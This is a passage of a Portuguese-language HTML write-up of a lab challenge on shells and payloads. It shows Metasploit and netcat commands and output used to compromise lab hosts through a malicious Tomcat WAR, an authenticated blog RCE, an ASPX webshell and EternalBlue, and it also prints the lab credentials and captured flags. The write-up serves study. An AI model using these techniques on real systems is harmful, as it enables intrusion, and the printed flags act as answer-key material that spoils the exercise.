+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-1-tomcat-shells-winsvr-war-malicioso-shell-reversa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 1 — Tomcat (shells-winsvr): WAR malicioso → shell reversa
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-2-blog-shells-nixsvr-rce-autenticado-via-metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 2 — Blog (shells-nixsvr): RCE autenticado via Metasploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-3-shells-winblue-17216113-iis-webshell-antak" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 3 — SHELLS-WINBLUE (172.16.1.13): IIS → webshell Antak
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-4-shells-winblue-eternalblue-ms17-010" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 4 — SHELLS-WINBLUE: EternalBlue (MS17-010)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-e-pos-acesso" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🐚 Shell e Pós-Acesso
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🐚 Shell e Pós-Acesso">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeracao-em-shells-nixsvr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeração em shells-nixsvr
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resumo-de-acessos-obtidos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resumo de acessos obtidos
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚩 Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo-tecnico" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📖 Resumo Técnico
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#licoes-aprendidas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 Lições Aprendidas
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="shells-e-payloads-desafio">🏴️ Shells e Payloads - Desafio</h1>
+<blockquote>
+<p><strong>Dificuldade:</strong> Medium | <strong>SO:</strong> Misto (Windows + Linux) | <strong>Plataforma:</strong> CPTS — Módulo Shells &amp; Payloads</p>
+</blockquote>
+<div class="admonition info">
+<p class="admonition-title">Sobre esta página</p>
+<p>Desafio do módulo <strong>Shells &amp; Payloads</strong> (CPTS). Acesso via RDP a um host de
+salto (foothold) já dentro da rede interna, de onde três alvos são atacados
+em sequência: um servidor Windows com Tomcat, um servidor Linux com um blog
+PHP vulnerável e um segundo servidor Windows explorável via EternalBlue.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Sobre os IPs</p>
+<p>O IP público de acesso RDP ao host de salto mudou entre os blocos de saída
+(<code>10.129.93.110</code>, <code>10.129.204.126</code>, <code>10.129.94.4</code>), provavelmente por reset
+do laboratório durante o estudo. Os IPs <strong>internos</strong> (<code>172.16.1.x</code>) se
+mantiveram estáveis durante toda a exploração. Todas as saídas foram
+mantidas exatamente como apareceram no terminal.</p>
+</div>
+<hr />
+<h2 id="informacoes-gerais">📋 Informações Gerais</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Host de entrada</strong></td>
+<td style="text-align: left;"><code>skills-foothold</code> (acesso via RDP)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>IP (RDP, variável)</strong></td>
+<td style="text-align: left;"><code>10.129.93.110</code> / <code>10.129.204.126</code> / <code>10.129.94.4</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Hosts internos</strong></td>
+<td style="text-align: left;"><code>172.16.1.11</code> (shells-winsvr) · <code>172.16.1.12</code> (shells-nixsvr) · <code>172.16.1.13</code> (SHELLS-WINBLUE)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>SO</strong></td>
+<td style="text-align: left;">Misto — Windows (foothold, winsvr, winblue) e Linux (nixsvr)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Dificuldade</strong></td>
+<td style="text-align: left;">Medium</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Plataforma / Módulo</strong></td>
+<td style="text-align: left;">CPTS — Shells &amp; Payloads</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Domínio interno</strong></td>
+<td style="text-align: left;"><code>inlanefreight.local</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Data</strong></td>
+<td style="text-align: left;">07/08/2026</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Status</strong></td>
+<td style="text-align: left;">✅ Finalizado</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition abstract">
+<p class="admonition-title">Objetivo</p>
+<p>A partir de um host de salto na rede interna, obter acesso e capturar as
+flags dos demais hosts, usando diferentes técnicas de geração e entrega de
+shells/payloads (WAR malicioso, RCE autenticado via Metasploit, webshell
+ASPX e EternalBlue).</p>
+</div>
+<hr />
+<h2 id="enumeracao-inicial">🔍 Enumeração Inicial</h2>
+<h3 id="credenciais-encontradas-no-host-de-entrada">Credenciais encontradas no host de entrada</h3>
+<p>Logo após o acesso RDP ao <code>skills-foothold</code>, um arquivo <code>access-creds.txt</code> na
+área de trabalho continha credenciais de dois serviços internos:</p>
+<p><img alt="Arquivo access-creds.txt com credenciais do blog e do Tomcat" src="../../img/shells-e-payloads-desafio/01-access-creds-rdp.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>to manage the blog:
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>- admin / admin123!@#  ( keep it simple for the new admins )
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>to manage Tomcat on apache
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>- tomcat / Tomcatadm
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Change the passwords soon..
+</code></pre></div>
+<div class="admonition success">
+<p class="admonition-title">Credenciais obtidas (foothold)</p>
+<ul>
+<li><strong>Blog admin:</strong> <code>admin</code> / <code>admin123!@#</code></li>
+<li><strong>Tomcat manager:</strong> <code>tomcat</code> / <code>Tomcatadm</code></li>
+</ul>
+</div>
+<h3 id="portas-e-servicos-encontrados-17216113">Portas e Serviços Encontrados (172.16.1.13)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-sS<span class="w"> </span>-Pn<span class="w"> </span>--disable-arp-ping<span class="w"> </span><span class="m">172</span>.16.1.13
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Porta</th>
+<th style="text-align: left;">Serviço</th>
+<th style="text-align: left;">Versão / Banner</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">80</td>
+<td style="text-align: left;">http</td>
+<td style="text-align: left;">Microsoft IIS httpd 10.0</td>
+</tr>
+<tr>
+<td style="text-align: left;">135</td>
+<td style="text-align: left;">msrpc</td>
+<td style="text-align: left;">Microsoft Windows RPC</td>
+</tr>
+<tr>
+<td style="text-align: left;">139</td>
+<td style="text-align: left;">netbios-ssn</td>
+<td style="text-align: left;">Microsoft Windows netbios-ssn</td>
+</tr>
+<tr>
+<td style="text-align: left;">445</td>
+<td style="text-align: left;">microsoft-ds</td>
+<td style="text-align: left;">Windows Server 2016 Standard 14393 microsoft-ds</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="Resultado do nmap em 172.16.1.13 - parte 1 (IIS, RPC, SMB)" src="../../img/shells-e-payloads-desafio/08-nmap-172-16-1-13-parte1.png" />
+<img alt="Resultado do nmap em 172.16.1.13 - parte 2 (host SHELLS-WINBLUE, Windows Server 2016)" src="../../img/shells-e-payloads-desafio/09-nmap-172-16-1-13-parte2.png" /></p>
+<h3 id="descobertas">Descobertas</h3>
+<ul>
+<li>[x] <code>access-creds.txt</code> no foothold expõe credenciais do <strong>blog</strong> e do <strong>Tomcat</strong></li>
+<li>[x] IIS em <code>172.16.1.13</code> com <strong>TRACE</strong> habilitado (<code>http-methods</code>) e indexação de diretório exposta</li>
+<li>[x] <code>smb-security-mode</code>: <strong>message signing enabled but not required</strong> — assinatura SMB não obrigatória</li>
+<li>[x] <code>smb-os-discovery</code> revela hostname <strong><code>SHELLS-WINBLUE</code></strong>, Windows Server 2016 Standard 14393 → candidato a MS17-010 (EternalBlue)</li>
+</ul>
+<hr />
+<h2 id="tecnicas-utilizadas">🎯 Técnicas Utilizadas</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">#</th>
+<th style="text-align: left;">Técnica</th>
+<th style="text-align: left;">Onde / Como foi aplicada</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">1</td>
+<td style="text-align: left;">Acesso via RDP com credenciais fornecidas</td>
+<td style="text-align: left;">Host de salto <code>skills-foothold</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">2</td>
+<td style="text-align: left;">Payload WAR malicioso via <code>msfvenom</code> + Tomcat Manager</td>
+<td style="text-align: left;">Deploy com <code>tomcat</code>/<code>Tomcatadm</code> → shell em <code>shells-winsvr</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">3</td>
+<td style="text-align: left;">Listener <code>nc</code> para shell reversa</td>
+<td style="text-align: left;">Recebimento da conexão de <code>172.16.1.11</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">4</td>
+<td style="text-align: left;">RCE autenticado via Metasploit (<code>multi/http/fbs_blog_rce</code>)</td>
+<td style="text-align: left;">Blog PHP em <code>blog.inlanefreight.local</code> (172.16.1.12), login <code>admin</code>/<code>admin123!@#</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">5</td>
+<td style="text-align: left;">Enumeração pós-exploração (vhosts, <code>/</code>, filesystem)</td>
+<td style="text-align: left;">Meterpreter → shell em <code>shells-nixsvr</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">6</td>
+<td style="text-align: left;">Upload de webshell ASPX (Antak) via indexador IIS exposto</td>
+<td style="text-align: left;"><code>172.16.1.13/uploads/antak.aspx</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">7</td>
+<td style="text-align: left;">Exploração EternalBlue (<code>auxiliary/admin/smb/ms17_010_command</code>)</td>
+<td style="text-align: left;"><code>172.16.1.13</code> (SHELLS-WINBLUE) → execução de comando como SYSTEM</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="exploracao-acesso-inicial">🚀 Exploração / Acesso Inicial</h2>
+<h3 id="vetor-de-entrada">Vetor de Entrada</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Vetor</strong></td>
+<td style="text-align: left;">RDP ao host de salto <code>skills-foothold</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Ferramentas</strong></td>
+<td style="text-align: left;">FreeRDP, <code>nc</code>, <code>msfvenom</code>/<code>msfconsole</code>, navegador</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Acesso obtido como</strong></td>
+<td style="text-align: left;"><code>htb-student</code> (foothold)</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">Credenciais de RDP</p>
+<p>O login RDP no <code>skills-foothold</code> foi feito com credenciais fornecidas pelo
+desafio, mas <strong>elas não aparecem no log/print</strong> — apenas o resultado do
+acesso (usuário <code>htb-student</code>).</p>
+</div>
+<h3 id="etapa-1-tomcat-shells-winsvr-war-malicioso-shell-reversa">Etapa 1 — Tomcat (shells-winsvr): WAR malicioso → shell reversa</h3>
+<p>Com as credenciais <code>tomcat</code>/<code>Tomcatadm</code>, um payload WAR (<code>ROOT.war</code>) foi
+preparado e enviado ao Tomcat Manager. Um listener <code>nc</code> foi aberto no
+foothold e recebeu a conexão de volta:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nano<span class="w"> </span>ROOT.war
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>...
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">172</span>.16.1.5<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">172</span>.16.1.11<span class="o">]</span><span class="w"> </span><span class="m">49828</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Version<span class="w"> </span><span class="m">10</span>.0.17763.2114<span class="o">]</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2018</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>All<span class="w"> </span>rights<span class="w"> </span>reserved.
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="w"> </span><span class="o">(</span>x86<span class="o">)</span><span class="se">\A</span>pache<span class="w"> </span>Software<span class="w"> </span>Foundation<span class="se">\T</span>omcat<span class="w"> </span><span class="m">10</span>.0&gt;hostname
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>hostname
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>shells-winsvr
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="w"> </span><span class="o">(</span>x86<span class="o">)</span><span class="se">\A</span>pache<span class="w"> </span>Software<span class="w"> </span>Foundation<span class="se">\T</span>omcat<span class="w"> </span><span class="m">10</span>.0&gt;whoami
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>whoami
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>nt<span class="w"> </span>authority<span class="se">\l</span>ocal<span class="w"> </span>service
+</code></pre></div>
+<p><img alt="Shell reverso obtido via WAR malicioso no Tomcat (host shells-winsvr)" src="../../img/shells-e-payloads-desafio/02-reverse-shell-tomcat-winsvr.png" /></p>
+<div class="admonition success">
+<p class="admonition-title">Acesso — shells-winsvr</p>
+<p>Shell reversa como <code>nt authority\local service</code> em <code>172.16.1.11</code>
+(<code>shells-winsvr</code>), recebida no listener <code>172.16.1.5:4444</code>.</p>
+</div>
+<h3 id="etapa-2-blog-shells-nixsvr-rce-autenticado-via-metasploit">Etapa 2 — Blog (shells-nixsvr): RCE autenticado via Metasploit</h3>
+<p>Adicionando <code>blog.inlanefreight.local</code> ao <code>/etc/hosts</code> (→ <code>172.16.1.12</code>) e
+logando com <code>admin</code>/<code>admin123!@#</code>, um post no blog apontava para um exploit
+autenticado do Exploit-DB:</p>
+<p><img alt="Post no blog com link para exploit do Facebook-styled blog no Exploit-DB" src="../../img/shells-e-payloads-desafio/03-blog-post-link-exploit.png" /></p>
+<blockquote>
+<p><em>Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE)
+(Authenticated) (Metasploit)</em> — exploit-db.com/exploits/50064</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>msf6 exploit(multi/http/fbs_blog_rce) &gt; exploit
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>[*] Got CSRF token: 34a61ef518
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>[*] Logging into the blog...
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>[+] Successfully logged in with admin
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>[+] Uploading shell...
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>[+] Shell uploaded as data/i/4EJ0.php
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>[+] Payload successfully triggered !
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>[*] Meterpreter session 1 opened (0.0.0.0:0 -&gt; 172.16.1.12:4444)
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>meterpreter &gt; shell
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>whoami
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>www-data
+</code></pre></div>
+<p><img alt="Exploração via msfconsole (fbs_blog_rce) com sessão meterpreter e shell www-data" src="../../img/shells-e-payloads-desafio/04-msf-fbs-blog-rce-shell.png" /></p>
+<p>Confirmando o host:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>hostnamectl
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span>Static<span class="w"> </span>hostname:<span class="w"> </span>shells-nixsvr
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span>Operating<span class="w"> </span>System:<span class="w"> </span>Ubuntu<span class="w"> </span><span class="m">20</span>.04.3<span class="w"> </span>LTS
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span>Kernel:<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.4.0-88-generic
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">  </span>Architecture:<span class="w"> </span>x86-64
+</code></pre></div>
+<p><img alt="Informações do sistema via hostnamectl (host shells-nixsvr, Ubuntu 20.04.3)" src="../../img/shells-e-payloads-desafio/05-hostname-so-nixsvr.png" /></p>
+<div class="admonition success">
+<p class="admonition-title">Acesso — shells-nixsvr</p>
+<p>Shell como <code>www-data</code> em <code>172.16.1.12</code> (<code>shells-nixsvr</code>), via RCE
+autenticado no blog PHP.</p>
+</div>
+<h3 id="etapa-3-shells-winblue-17216113-iis-webshell-antak">Etapa 3 — SHELLS-WINBLUE (172.16.1.13): IIS → webshell Antak</h3>
+<p>O indexador de diretórios do IIS estava exposto, com <code>upload.aspx</code> disponível:</p>
+<p><img alt="Indexador de arquivos IIS exposto em 172.16.1.13 com upload.aspx" src="../../img/shells-e-payloads-desafio/10-indexador-arquivos-iis.png" /></p>
+<p>Um webshell ASPX (<strong>Antak</strong>) foi enviado via <code>upload.aspx</code>, dando acesso
+interativo ao PowerShell:</p>
+<p><img alt="Webshell Antak executando PowerShell (iis apppool\defaultapppool)" src="../../img/shells-e-payloads-desafio/11-antak-webshell-powershell.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>PS&gt; whoami
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>iis apppool\defaultapppool
+</code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">Tentativa que NÃO progrediu</p>
+<p>Acesso a <code>C:\Users\Administrator</code> a partir da webshell Antak (<code>iis
+apppool\defaultapppool</code>) é privilegiado — não foi possível avançar por
+esse caminho diretamente.</p>
+</div>
+<h3 id="etapa-4-shells-winblue-eternalblue-ms17-010">Etapa 4 — SHELLS-WINBLUE: EternalBlue (MS17-010)</h3>
+<p>O <code>nmap</code> já indicava assinatura SMB não obrigatória e o hostname
+<code>SHELLS-WINBLUE</code>, o que motivou a busca por módulos EternalBlue no
+<code>msfconsole</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>msf6 &gt; search eternalblue
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">#</th>
+<th style="text-align: left;">Módulo</th>
+<th style="text-align: left;">Rank</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">0</td>
+<td style="text-align: left;"><code>exploit/windows/smb/ms17_010_eternalblue</code></td>
+<td style="text-align: left;">average</td>
+</tr>
+<tr>
+<td style="text-align: left;">1</td>
+<td style="text-align: left;"><code>exploit/windows/smb/ms17_010_psexec</code></td>
+<td style="text-align: left;">normal</td>
+</tr>
+<tr>
+<td style="text-align: left;">2</td>
+<td style="text-align: left;"><code>auxiliary/admin/smb/ms17_010_command</code></td>
+<td style="text-align: left;">normal</td>
+</tr>
+<tr>
+<td style="text-align: left;">3</td>
+<td style="text-align: left;"><code>auxiliary/scanner/smb/smb_ms17_010</code></td>
+<td style="text-align: left;">normal</td>
+</tr>
+<tr>
+<td style="text-align: left;">4</td>
+<td style="text-align: left;"><code>exploit/windows/smb/smb_doublepulsar_rce</code></td>
+<td style="text-align: left;">great</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="Módulos EternalBlue disponíveis no msfconsole (ms17_010)" src="../../img/shells-e-payloads-desafio/12-msf-modulos-eternalblue.png" /></p>
+<p>Usando o módulo <code>2</code> (<code>auxiliary/admin/smb/ms17_010_command</code>), com <code>RHOSTS
+172.16.1.13</code> e o comando <code>type C:\Users\Administrator\Desktop\Skills-flag.txt</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>msf6 auxiliary(admin/smb/ms17_010_command) &gt; set RHOSTS 172.16.1.13
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>msf6 auxiliary(admin/smb/ms17_010_command) &gt; set command type C:\Users\Administrator\Desktop\Skills-flag.txt
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>msf6 auxiliary(admin/smb/ms17_010_command) &gt; exploit
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>[*] 172.16.1.13:445 - Built a write-what-where primitive...
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>[+] 172.16.1.13:445 - Command completed successfully!
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>[*] 172.16.1.13:445 - Output for &quot;type C:\Users\Administrator\Desktop\Skills-flag.txt&quot;:
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>One-H0st-Down!
+</code></pre></div>
+<p><img alt="Exploit ms17_010_command executado com sucesso, flag final capturada" src="../../img/shells-e-payloads-desafio/13-eternalblue-exploit-flag-final.png" /></p>
+<div class="admonition success">
+<p class="admonition-title">Acesso — SHELLS-WINBLUE</p>
+<p>Execução de comando como <strong>SYSTEM</strong> via <code>ms17_010_command</code>
+(write-what-where primitive do MS17-010), sem necessidade de shell
+interativa.</p>
+</div>
+<hr />
+<h2 id="shell-e-pos-acesso">🐚 Shell e Pós-Acesso</h2>
+<h3 id="enumeracao-em-shells-nixsvr">Enumeração em shells-nixsvr</h3>
+<p>Com a shell <code>www-data</code>, foram enumerados vhosts internos e o filesystem:</p>
+<p><img alt="Enumeração de vhosts e diretórios do sistema (admin, app, blog, dev, drupal.inlanefreight.local)" src="../../img/shells-e-payloads-desafio/06-vhosts-e-diretorios.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>admin.inlanefreight.local
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>app.inlanefreight.local
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>blog.inlanefreight.local
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>dev.inlanefreight.local
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>drupal.inlanefreight.local
+</code></pre></div>
+<p>A flag foi localizada em <code>customscripts/flag.txt</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">cd</span><span class="w"> </span>customscripts
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>ls
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>flag.txt
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>cat<span class="w"> </span>flag.txt
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>B1nD_Shells_r_cool
+</code></pre></div>
+<p><img alt="Flag capturada em customscripts/flag.txt (shells-nixsvr)" src="../../img/shells-e-payloads-desafio/07-flag-nixsvr.png" /></p>
+<h3 id="resumo-de-acessos-obtidos">Resumo de acessos obtidos</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Host</th>
+<th style="text-align: left;">IP</th>
+<th style="text-align: left;">Acesso</th>
+<th style="text-align: left;">Método</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>skills-foothold</code></td>
+<td style="text-align: left;"><code>10.129.x.x</code> (RDP)</td>
+<td style="text-align: left;"><code>htb-student</code></td>
+<td style="text-align: left;">RDP com credenciais fornecidas</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>shells-winsvr</code></td>
+<td style="text-align: left;"><code>172.16.1.11</code></td>
+<td style="text-align: left;"><code>nt authority\local service</code></td>
+<td style="text-align: left;">WAR malicioso no Tomcat</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>shells-nixsvr</code></td>
+<td style="text-align: left;"><code>172.16.1.12</code></td>
+<td style="text-align: left;"><code>www-data</code></td>
+<td style="text-align: left;">RCE autenticado (<code>fbs_blog_rce</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>SHELLS-WINBLUE</code></td>
+<td style="text-align: left;"><code>172.16.1.13</code></td>
+<td style="text-align: left;"><code>iis apppool\defaultapppool</code> → <strong>SYSTEM</strong></td>
+<td style="text-align: left;">Webshell Antak → EternalBlue (<code>ms17_010_command</code>)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="flags">🚩 Flags</h2>
+<ul>
+<li>[x] Flag capturada em <code>shells-nixsvr</code></li>
+<li>[x] Flag capturada em <code>SHELLS-WINBLUE</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Flag</th>
+<th style="text-align: left;">Local</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>B1nD_Shells_r_cool</code></td>
+<td style="text-align: left;"><code>customscripts/flag.txt</code> (shells-nixsvr, 172.16.1.12)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>One-H0st-Down!</code></td>
+<td style="text-align: left;"><code>C:\Users\Administrator\Desktop\Skills-flag.txt</code> (SHELLS-WINBLUE, 172.16.1.13)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="resumo-tecnico">📖 Resumo Técnico</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
